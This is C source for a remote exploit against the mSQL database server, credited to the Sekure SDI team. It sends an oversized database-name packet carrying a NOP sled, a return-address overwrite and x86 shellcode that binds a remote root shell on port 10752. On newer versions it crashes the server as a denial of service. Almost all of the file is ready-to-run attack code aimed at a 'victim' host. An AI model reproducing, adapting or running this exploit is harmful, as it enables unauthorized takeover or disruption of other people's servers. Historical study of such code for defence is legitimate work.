/* 
 * [ Sekure SDI - http://www.sekure.org ]
 * |                                    |
 * |     mSQL DBname Remote Exploit     |    
 * | ---------------------------------- |
 * |   Exploit for testing the DBNAME   |
 * |      vulnerability found by        |
 * |                                    |
 * |      http://ssc.sekure.org         |
 * |   Sekure SDI Secure Coding Team    |
 * | ---------------------------------- |
 * |   by c0nd0r <condor@sekure.org>    |
 * |   by jamez  <jamez@sekure.org >    |
 * | ---------------------------------- |
 * |  In versions above 2.0.3, it will  |
 * |  only work as a denial of service  |
 * | ---------------------------------- |
 * [ thanks for the ppl at sekure.org:  ]
 * [ vader, fcon, bishop, dumped, slide ]
 * [ bahamas, yuckfoo(sweden), paranoia ]
 *
 *
 * Versions above 2.0.3 are not vulnerable to the bindcode, tough,
 * they are vulnerable to a denial of service.
 *
 * this good will bind you a shell in the port 10752.
 * usage: ./SDI-mSQL-db host [port] [offset]
 * default: port = 1114 (mSQL 2.0) |  offset = 0
 *
 *
 * remember: be ethical. 
 * thanks also goes to t0xie & casper(hax0r), marty(fit) and people at
 * (irc.brasnet.org) #uground.  
 *
 */


#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>

#define PKT_LEN 14000

static 	u_char	packetBuf[PKT_LEN];
int	readTimeout;
u_char	*packet = NULL;

/* da hex code */
char bindcode[] =
 "\x33\xDB\x33\xC0\xB0\x1B\xCD\x80\x33\xD2\x33\xc0\x8b\xDA\xb0\x06"
 "\xcd\x80\xfe\xc2\x75\xf4\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x62"
 "\xeb\x62\x5e\x56\xac\x3c\xfd\x74\x06\xfe\xc0\x74\x0b\xeb\xf5\xb0"
 "\x30\xfe\xc8\x88\x46\xff\xeb\xec\x5e\xb0\x02\x89\x06\xfe\xc8\x89"
 "\x46\x04\xb0\x06\x89\x46\x08\xb0\x66\x31\xdb\xfe\xc3\x89\xf1\xcd"
 "\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x2a\x66\x89\x46\x0e\x8d"
 "\x46\x0c\x89\x46\x04\x31\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0"

"\x66\xfe\xc3\xcd\x80\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04\xcd\x80\xeb\x04"
"\xeb\x4c\xeb\x52\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xfe\xc3\xcd\x80"
"\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xfe\xc1\xcd\x80\xb0\x3f\xfe\xc1"
"\xcd\x80\xb8\x2e\x62\x69\x6e\x40\x89\x06\xb8\x2e\x73\x68\x21\x40\x89\x46"
"\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e"
"\x08\x8d\x56\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x45\xff\xff"
"\xff\xFF\xFD\xFF\x50\x72\x69\x76\x65\x74\x20\x41\x44\x4D\x63\x72\x65\x77";

void intToBuf(cp,val)
        u_char  *cp;
        int     val;
{
        *cp++ = (unsigned int)(val & 0x000000ff);
        *cp++ = (unsigned int)(val & 0x0000ff00) >> 8;
        *cp++ = (unsigned int)(val & 0x00ff0000) >> 16;
        *cp++ = (unsigned int)(val & 0xff000000) >> 24;
}


int bufToInt(cp)
        u_char  *cp;
{
        int val;
 
        val = 0;
        val = *cp++;
        val += ((int) *cp++) << 8 ;
        val += ((int) *cp++) << 16;
        val += ((int) *cp++) << 24;
        return(val);
}


int writePkt(fd)
	int	fd;
{
	int	len,
		offset,
		remain,
		numBytes;

	len = strlen(packet);
	intToBuf(packetBuf,len);
	offset = 0;
	remain = len+4;
	while(remain > 0)
	{
		numBytes = write(fd,packetBuf + offset, remain);
		if (numBytes == -1)
		{
			return(-1);
		}
		offset += numBytes;
		remain -= numBytes;
	}
	return(0);
}


int readPkt(fd)
	int	fd;
{
	u_char	 buf[4];
	int	len,
		remain,
		offset,
		numBytes;

	readTimeout = 0;
	remain = 4;
	offset = 0;
	while(remain > 0)
	{
		numBytes = read(fd,buf + offset,remain);
		if(numBytes <= 0)
		{
			alarm(0);
         		return(-1);
		}
		remain -= numBytes;
		offset += numBytes;
		
	}
	len = bufToInt(buf);
	if (len > PKT_LEN)
	{
		fprintf(stderr,"Packet too large (%d)\n", len);
		alarm(0);
		return(-1);
	}
	remain = len;
	offset = 0;
	while(remain > 0)
	{
		numBytes = read(fd,packet+offset,remain);
		if (readTimeout)
		{
			alarm(0);
			return(-1);
		}
		if (numBytes <= 0)
		{
			alarm(0);
         		return(-1);
		}
		remain -= numBytes;
		offset += numBytes;
	}
	*(packet+offset) = 0;
        return(len);
}


usage(char *arg) {

  printf("this goodie will bind you a shell in the remote host.\n");
  printf("usage: %s victim [port] [offset]\n", arg); 
  exit(0);  

}


main(int argc, char **argv) {
  struct sockaddr_in sa;
  struct hostent *he;
  char buffer[12000], host[256];
  int x, y = 0, offset = 0, port = 1114;
  long addr;
  int sockd, len;

  printf("Sekure SDI - Brazilian Information Security Team\n");
  printf("mSQL DBname Remote Exploit\n");
  printf("--------------------------\n");

  if (argc < 2)
     usage(argv[0]);

  snprintf(host, 255, "%s", argv[1]);
  if (argc > 2) port = atoi(argv[2]);
  if (argc > 4) offset = atoi(argv[4]);

  packet = (u_char *) packetBuf + 4;

  sa.sin_family = AF_INET; sa.sin_port = htons(port);
  he = gethostbyname(host);

  if (!he) {
    if ((sa.sin_addr.s_addr = inet_addr(host)) == INADDR_NONE) { printf("unknown ip number\n"); exit(0); }
  } else {
    bcopy(he->h_addr, (struct in_addr *) &sa.sin_addr, he->h_length);
  }

  sockd = socket( AF_INET, SOCK_STREAM, 0);

  if ( connect( sockd, (struct sockaddr *) &sa, sizeof(sa)) < 0) {
   perror("connect"); exit(0);
  } 

  addr = 0xbffff309 - offset;
  printf("going for 0x%x at %s\n", addr, host);

  readPkt(sockd);
  printf( "mSQL Version %s", packet);
  sprintf( packet, "%s", "root\0");
  writePkt(sockd);

  y = 0;

  for (x = 0; x <= (1002-strlen(bindcode)); x++)
    buffer[x] = 0x90;

  for ( ; y < strlen(bindcode); x++, y++)
    buffer[x] = bindcode[y]; 

  for ( ; x <= 1018; x+=4) { 
   buffer[x  ] =  addr & 0x000000ff; 
   buffer[x+1] = (addr & 0x0000ff00) >> 8; 
   buffer[x+2] = (addr & 0x00ff0000) >> 16; 
   buffer[x+3] = (addr & 0xff000000) >> 24; 
  }

  buffer[strlen(buffer)] = '\0';

  sprintf( packet, "2:%s", buffer);
  writePkt(sockd);


  printf("\n0wned$ :D\n");
  printf("(the mSQL server must be off now! If it's still up, try again)\n");
  close(sockd);

/*

 free as a goddamn bird... 

 buffer                ebp   eip
[12341234123412341234][1234][1234]
 |                  |  |     | 
 0                 997 998  1002 
                   
*/

}

